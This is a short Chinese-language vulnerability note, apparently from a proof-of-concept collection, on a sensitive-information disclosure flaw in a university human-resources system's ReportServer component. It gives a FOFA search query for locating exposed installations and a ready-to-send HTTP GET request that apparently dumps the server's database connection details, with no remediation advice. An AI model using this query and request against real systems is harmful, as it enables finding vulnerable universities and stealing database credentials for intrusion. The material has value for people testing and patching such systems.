# 高校人力资源管理系统ReportServer存在敏感信息泄露漏洞
高校人力资源管理系统ReportServer存在敏感信息泄露漏洞

## fofa
```javascript
body="FM_SYS_ID" || body="product/recruit/website/RecruitIndex.jsp"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1729414884399-6be61b88-4e82-42e2-bfb0-451f6e130f92.png)

## poc
```java
GET /ReportServer?op=Fr_server&cmd=Sc_getconnectioninfo HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1729415182606-37ca16b7-4b31-40ae-b37a-7350c1af4d59.png)

